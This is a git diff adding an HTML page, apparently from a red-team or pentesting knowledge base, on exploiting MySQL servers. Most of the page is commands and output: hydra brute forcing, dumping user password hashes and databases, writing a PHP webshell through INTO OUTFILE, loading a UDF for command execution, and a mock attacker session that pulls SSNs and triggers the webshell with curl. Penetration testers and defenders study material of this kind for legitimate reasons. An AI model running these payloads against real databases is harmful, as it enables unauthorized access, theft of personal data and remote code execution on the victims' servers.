@@ -1,0 +1,218 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">MySQL Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Databases</strong> • Focus: <strong>MySQL Abuse & Unauthorized Access</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    MySQL (TCP/3306) is a popular relational database used across enterprises and web apps. 
+    Misconfigured MySQL often allows attackers to connect with weak/default credentials or 
+    excessive privileges. Exploitation includes brute forcing accounts, enumerating schemas, 
+    dumping sensitive data, escalating privileges, and even achieving remote code execution 
+    via User Defined Functions (UDFs) or the FILE privilege. In Red Team operations, 
+    MySQL exploitation provides a direct path to data theft and pivoting deeper into networks.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Weak/Default Credentials:</strong> admin/admin, root/root still widely found.</li>
+    <li><strong>Privilege Misconfigurations:</strong> FILE and SUPER grants abused for RCE.</li>
+    <li><strong>No Encryption:</strong> Many deployments allow cleartext connections.</li>
+    <li><strong>Wide Exposure:</strong> MySQL often accessible from the internet due to misconfigs.</li>
+    <li><strong>Known Vulnerabilities:</strong> Buffer overflows and privilege escalation CVEs.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify open TCP/3306 services.</li>
+    <li><strong>Authentication:</strong> Attempt connection with weak or default creds.</li>
+    <li><strong>Enumeration:</strong> List databases, tables, and users.</li>
+    <li><strong>Exfiltration:</strong> Dump sensitive data (PII, credentials, API keys).</li>
+    <li><strong>Privilege Escalation:</strong> Abuse FILE/UDF functions for code execution.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and fingerprint MySQL service.</li>
+    <li>Brute force or test known weak accounts.</li>
+    <li>Enumerate databases, tables, and users.</li>
+    <li>Dump data with <code>mysqldump</code> or SQL queries.</li>
+    <li>Abuse FILE privilege to read/write files (e.g., webshell).</li>
+    <li>Upload malicious UDF for RCE.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p3306 --script mysql-info [target]
+
+# ------------------------------
+# Connect to MySQL
+# ------------------------------
+mysql -h [target] -u root -p
+mysql -h [target] -u admin -p password123
+
+# ------------------------------
+# Brute Force
+# ------------------------------
+hydra -L users.txt -P passwords.txt mysql://[target]
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+SHOW DATABASES;
+USE mysql;
+SELECT user, host, authentication_string FROM user;
+
+# ------------------------------
+# Dump Data
+# ------------------------------
+mysqldump -u root -p -h [target] db_name > dump.sql
+
+# ------------------------------
+# Abuse FILE Privilege
+# ------------------------------
+SELECT LOAD_FILE('/etc/passwd');
+SELECT "<?php system($_GET['cmd']); ?>" 
+  INTO OUTFILE '/var/www/html/shell.php';
+
+# ------------------------------
+# User Defined Function (UDF) RCE
+# ------------------------------
+USE mysql;
+CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so';
+SELECT sys_exec('id');
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p3306 --script mysql-info 192.168.1.50
+mysql -h 192.168.1.50 -u root -p
+SHOW DATABASES;
+mysqldump -u root -p -h 192.168.1.50 finance > finance.sql
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p3306 --script mysql-info 192.168.1.60
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 5.7.29
+
+[ saide ~ ]$ mysql -h 192.168.1.60 -u root -p
+Enter password: root123
+Welcome to the MySQL monitor.
+
+mysql> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| finance            |
++--------------------+
+
+mysql> USE finance;
+mysql> SHOW TABLES;
++------------+
+| Tables     |
++------------+
+| employees  |
+| payments   |
++------------+
+
+mysql> SELECT * FROM employees LIMIT 1;
++----+---------+-------------+
+| id | name    | ssn         |
++----+---------+-------------+
+| 1  | Alice   | 123-45-6789 |
++----+---------+-------------+
+
+[+] Sensitive PII retrieved
+
+mysql> SELECT "<?php system($_GET['cmd']); ?>" 
+       INTO OUTFILE '/var/www/html/shell.php';
+Query OK, 1 row affected
+
+[ saide ~ ]$ curl http://victim/shell.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+[+] RCE achieved via webshell
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample MySQL exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+3306/tcp open  mysql 5.7.29
+
+# Weak Credentials
+root : root123
+
+# Data Exfiltration
+Database: finance
+Table: employees
+Record: Alice | SSN: 123-45-6789
+
+# FILE Privilege Exploitation
+Webshell dropped to /var/www/html/shell.php
+
+# Proof of Exploitation
+Remote Code Execution via SQL → Webshell → www-data access
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting MySQL
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1505/001/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – SQL Stored Procedures (UDF abuse)
+      </a>
+    </li>
+    <li>Red Team workflow: Discovery → Weak creds → Enum → Dump data → FILE/UDF → RCE pivot.</li>
+  </ul>
+</section>
